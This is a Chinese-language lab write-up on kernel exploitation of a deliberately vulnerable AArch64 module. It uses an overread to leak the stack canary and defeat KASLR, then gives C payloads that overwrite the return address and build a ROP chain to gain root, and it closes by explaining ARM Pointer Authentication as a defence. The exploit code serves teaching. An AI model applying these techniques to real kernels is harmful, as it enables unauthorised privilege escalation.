
## Task 1: 绕过 stack canary 和 KASLR
根据实验指导的提示，用户调用`read`和`write`时，会分别调用到`zjubof_read()`和`zjubof_write()`。<br />`zjubof_write()`一层一层调用到`zjubof_write4()`，看起来就比较草率了：它定义了一个`cmd_struct cmd`，将`buffer`指向的`len`个字节的内容放到`cmd.command`指向的内存里；然后又把`command[]`里的`cmd.length`个字节放到`prev_cmd`里；这里 `char prev_cmd[CMD_LENGTH]`也是一个全局变量，`CMD_LENGTH`是`49`。<br />再看`zjubof_read()`，这个函数限制了`len`不能大于等于`CMD_LENGTH`，即`49`个字节，否则返回一个错误代码；其效果是，将指针`prev_cmd`指向的`len`字节内容复制到`buffer`指向的内存中去。

首先从之前的分析可以得知，我们通过`read()`至多只能获取 48 个字节的内容；但是从`zjubof_write4()`中可以看出，如果我们在填入`cmd.command`时篡改`cmd.length`，那么我们就可以在后面填入`prev_cmd`时额外读取一些信息，形成 overread。

分析得知，我们以此法能看到的 48 个字节是：
![image.png](./assets/1651560151955-93adacfd-24c2-4511-b63f-458c6f9e3da1.png)
其要求是，`cmd.length`字段应当是`48`。

我们构造如下的 payload 实现 overread：
![image.png](./assets/1651551111149-5b4de543-73fa-4d53-a86c-9c03a6860ca4.png)
`len`设为`17`或者`24`。

因此，根据之前对栈的分析，我们可以获取到`canary`和`x30`的值了：
![image.png](./assets/1651560237527-aac5f644-c964-4b30-8115-17b873c24b3c.png)

看反汇编结果得知`write3()`的返回地址是`0xffff800010de7d0c`；因此，我们在实际运行时只需要计算获得的`x30`的值与`0xffff800010de7d0c`的差值，就可以得知当前 KASLR 提供的偏移了；即：
![image.png](./assets/1651561412529-42becf03-ab0c-4ffd-ac8d-38e5009ce9ce.png)
至此，我们可以绕过 canary 和 KASLR 了！

## Task 2: 修改 return address，获取 root 权限
Task 2 要求我们跳转到 `first_level_gadget()`，它首先用`commit_creds(prepare_kernel_cred(0));`提权，然后从栈上取了`fp`和`retAddr`，将`sp`增加了`0x220`并返回。<br />这些事情的目的是什么呢？<br />我们在`write4()`中篡改了`write3()`的返回地址后，从`write3()`返回到`first_level_gadget()`的某个地方；为了后面操作的正常进行，我们希望它能够正常返回；但是这时返回到`write2()`的地址已经被我们覆盖掉了，所以我们只能让它返回到`write1()`。恰好，在从`write3()`返回的时候`sp`会指向`write2()`的活动记录的最下面，因此这时候直接用`ldp`读到的就是返回`write1()`的正确地址和`fp`：
![image.png](./assets/1651568661907-8d24cf0a-73b7-472f-9903-e9ddea619fc5.png)
那么`sp += 0x220`是干什么呢？实际上就是因为，我们需要手动将`write2()`的活动记录回收掉；调试可以得知这个大小就是`write2()`活动记录的大小。

我们看一下对应的汇编代码：
![image.png](./assets/1651567629729-bf79e062-9e26-47b2-8f68-536ce828483d.png)
需要注意的是，我们不能够让这里第一行的操作修改掉`sp`。因此我们不能直接跳到第一行，而是跳到第二行或者第三行开始运行。

因此，我们的 payload 设计如下：
```c
    char buf[50] = "0123456789012345\x48";
    
    copyByte(canary, buf + 24);
    u64 target = 0xffff8000107abd80 + *(u64 *)offset;
    copyByte((char *)&target, buf + 40);
    
    write(fd, buf, 48); 
   
    system("/bin/sh");
```
即，我们将`canary`原样写入，然后根据`offset`和第三行的地址`0xffff8000107abd80`计算出`target`覆盖掉`ret addr`，然后调用`write`进行写入。

尝试编译运行，可以看到，我们成功获取了 root 权限，并获取了 flag：
![image.png](./assets/1651565872873-5f3fb698-be3f-4a8d-a00a-ab751cda3a25.png)

## Task 3: ROP 获取 root 权限
Task 3 要求我们通过 `-> prepare_kernel_cred() -> commit_creds() -> second_level_gadget() -> zjubof_write()`的路径获取 root 权限并正常返回。从之前的分析我们可以得知，这一串返回是从 `write3()`开始的。

我们依次观察各个函数返回时`sp`的变化：

- `write3()`返回时，`sp`会增加 32：

![image.png](./assets/1651629282002-f5e897e4-8aa0-49ed-bd39-799ce23da065.png)

- `prepare_kernel_cred()`（后面可能简写为`p_k_c`或`PKC`）返回时，`sp`会增加 32：

![image.png](./assets/1651629501723-c3d2475a-37d0-49db-9ab3-ddf222fcf8df.png)

- `commit_creds()`（后面可能简写为`c_c`或`CC`）返回时，`sp`会增加 48：

![image.png](./assets/1651629700954-d112b878-59aa-424c-84cb-7789aa6af6b3.png)

- `second_level_gadget()`（后面可能简写为`s_l_g`或`SLG`）返回时，`sp`会增加 464：

![image.png](./assets/1651629921313-ada165c0-fcbb-4192-a11f-a173140fbfaf.png)

据此，我们可以设计出我们 payload 的结构：
![image.png](./assets/1651631009808-c32d4a49-c23e-4143-ad08-4c0d38bec372.png)
这里面标明了每次返回之后`sp`的位置，以及对应地被使用到的返回地址。其中灰色的字段表示并不重要，我们将黑色的对应填上就好了！

下面我们研究每个返回地址应该取多少。如同我们在第 3 节中讨论过的，对于正常的函数，由于它们在第一行会修改`sp`，并且导致我们精心构造的返回地址被覆盖掉，因此我们需要跳过第一行，从第二行直接开始执行。<br />我们查看各次跳转的 target 地址：

- `p_k_c()`应当返回在第二句的地址，即`0xffff8000100a6214`：

![image.png](./assets/1651571240724-8b5f6098-a60b-476e-907d-c8cf2416ecb5.png)

- `c_c()`应当返回在第二句的地址，即`0xffff8000100a5f6c`：

![image.png](./assets/1651571319892-b9bf7488-e9f2-425d-a639-0446d7320183.png)

- `s_l_g()`非常友好，刚开始没有改`sp`，所以直接跳到开头`0xffff8000107abdb0`就好：

![image.png](./assets/1651571268207-b99f2ca2-a116-434f-808f-a36c905c80a1.png)

- `zjubof_write()`应当返回在调用`zjubof_write2()`的后一行，即 `0xffff8000107abe54`：

![image.png](./assets/1651630284270-4c7c9252-c692-4de9-9008-e82475f2fbb6.png)

也就是说，我们构造了这样的 payload：
```c
    char buf[200] = "A";
    
    copyByte(canary, buf + 24);
    
    u64 target = 0xffff8000100a6214 + *(u64 *)offset;
    copyByte((char *)&target, buf + 40);
    
    target = 0xffff8000100a5f6c + *(u64 *)offset;
    copyByte((char *)&target, buf + 72);
    
    target = 0xffff8000107abdb0 + *(u64 *)offset;
    copyByte((char *)&target, buf + 104);
    
    target = 0xffff8000107abe54 + *(u64 *)offset;
    copyByte((char *)&target, buf + 152);
    
    write(fd, buf, 160); 
   
    system("/bin/sh");
```

运行一下试试，成功了：
![image.png](./assets/1651631096489-e6d6592c-288b-42f6-8df9-9bb87f5be09e.png)

## Task 4: Linux 内核对 ROP 攻击的防护

### 1 艰难的编译和运行
用下面的指令编译：
```bash
export ARCH=arm64
make CROSS_COMPILE=aarch64-linux-gnu- defconfig
make CROSS_COMPILE=aarch64-linux-gnu- menuconfig
make CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc)
```
默认已经开启 PA，所以到配置的时候直接退出就好。

编译后把`start.sh`中的`-kernel ./Image`改成`-kernel ./vmlinux`尝试运行，发现跑不起来：<br />![WDAK459SVFWAIG(S[FGTSF5.png](./assets/1651636025711-3538311d-4f1d-4819-acd2-9f6ad443bf23.png)
于是尝试把 vmlinux 精简成 Image：`objcopy -O binary vmlinux Image --strip-all`<br />出现报错：`Unable to recognise the format of the input file 'vmlinux'`<br />问了同学，同学说要用 `aarch64-linux-gnu-objcopy`<br />然后终于能跑了））

### 2 研究防护机制
看一下`zjubof_write3()`的汇编：
![image.png](./assets/1651637757748-da41ee14-0686-4cb6-bacb-e39c577af551.png)
发现其实就是多了`paciasp`和`autiasp`这两个指令。

查询资料得知，这种防护机制叫做  ARM Pointer Authentication。<br />这种防护机制考虑到 AArch64 中的指针存在一些未被使用的字段：
![image.png](./assets/1651639069015-90e1b81f-0c3e-4e0f-a33f-aacefb7497c7.png)
因此它将该 Pointer 以及一个 64 位的 modifier（在`paciasp`和`autiasp`中就是`sp`，因为进入和退出函数的时候`sp`恰好相等）、一个 128 位的密钥（运行时生成的），以某种不在指令中说明的、有可能是 implementation defined 的算法生成 PAC, Pointer Authentication Code：
![image.png](./assets/1651639287994-033105f8-9e58-417b-ab86-9661670d89f1.png)
并将其嵌入在指针未被使用的字段中：
![image.png](./assets/1651639326622-dd65d0c4-fe44-47a6-b886-670349d2b706.png)
也就是说，在进入这个函数的时候，栈上存储的不再直接是返回地址，而是附带着加密信息的返回地址，退出时程序校验这个地址信息的有效性，如果有效才正常返回；而由于攻击者无法得知`key`以及加密算法，因此攻击者无法构造出一个附带合理加密信息的到任意地方的返回地址，因此无法进行 ROP 攻击。

### References

1. [https://lwn.net/Articles/718888/](https://lwn.net/Articles/718888/)
2. [https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf](https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf)
3. [https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ](https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ)

## Notes

- 安装 gef：
   - `git clone [https://github.com/hugsy/gef.git](https://github.com/hugsy/gef.git) ~/GdbPlugins`
   - `echo "source /~/GdbPlugins/gef.py" > ~/.gdbinit`
- 运行`debug.sh`失败是因为没给`x`权限
   - `chmod a+x debug.sh`

